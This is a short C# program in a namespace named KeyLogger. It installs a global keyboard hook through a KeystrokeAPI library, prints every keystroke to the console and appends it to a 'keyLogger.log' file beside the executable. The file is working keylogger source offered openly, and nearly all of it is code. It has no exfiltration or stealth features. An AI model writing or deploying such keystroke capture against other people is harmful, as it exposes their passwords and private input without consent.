using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Threading;
using System.Diagnostics;
// copy from https://github.com/fabriciorissetto/KeystrokeAPI

namespace KeyLogger
{
    static class Program
    {
        static void Main()
        {
            string logPath = Path.Combine(Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location), "keyLogger.log");
            Console.WriteLine(logPath);
            using (var api = new KeystrokeAPI())
            {
                api.CreateKeyboardHook((character) => { 
                    Console.Write(character);
                    try
                    {
                        File.AppendAllText(logPath, $"{character}");
                    }catch(Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                    
                });
                Application.Run();
            }
        }

    }
}
